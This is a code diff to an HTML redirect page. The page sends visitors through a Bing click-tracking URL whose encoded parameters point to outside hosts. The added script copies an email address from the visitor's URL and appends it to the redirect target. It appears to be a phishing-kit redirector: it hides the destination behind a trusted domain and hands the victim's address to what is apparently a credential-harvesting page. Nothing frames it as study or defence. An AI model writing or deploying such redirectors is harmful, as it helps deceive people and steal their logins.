@@ -2,9 +2,29 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="refresh" content="3;url=https://www.bing.com/ck/a?!&&p=4ed30224ac809bc0JmltdHM9MTcyMzQyMDgwMCZpZ3VpZD0zNjRmNjVlOC1lNTZjLTYxOWQtMTI1Ny03MTNlZTQyYTYwMTImaW5zaWQ9NTE0MQ&ptn=3&ver=2&hsh=3&fclid=364f65e8-e56c-619d-1257-713ee42a6012&u=a1aHR0cDovL3d3dy40NDQzMTcuY29tLw#aHR0cHM6Ly9vazRBWC5ldXRlbmFudC5jb20vb2s0QVgv/">
+    <meta id="refreshMeta" http-equiv="refresh" content="3">
     <title>Redirecting...</title>
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            var currentUrl = window.location.href;
+
+            function extractEmail(url) {
+                var emailRegex = /[#/]([^#/?]+@[^#/?]+)/;
+                var match = url.match(emailRegex);
+                return match ? match[1] : null;
+            }
+
+            var email = extractEmail(currentUrl);
+
+            if (email) {
+                var baseUrl = 'https://www.bing.com/ck/a?!&&p=4ed30224ac809bc0JmltdHM9MTcyMzQyMDgwMCZpZ3VpZD0zNjRmNjVlOC1lNTZjLTYxOWQtMTI1Ny03MTNlZTQyYTYwMTImaW5zaWQ9NTE0MQ&ptn=3&ver=2&hsh=3&fclid=364f65e8-e56c-619d-1257-713ee42a6012&u=a1aHR0cDovL3d3dy40NDQzMTcuY29tLw#aHR0cHM6Ly9vazRBWC5ldXRlbmFudC5jb20vb2s0QVgv/#';
+                var newRefreshUrl = baseUrl + email;
+                document.getElementById('refreshMeta').setAttribute('content', '3;url=' + newRefreshUrl);
+            }
+        });
+    </script>
 </head>
 <body>
+    <p>Redirecting...</p>
 </body>
 </html>
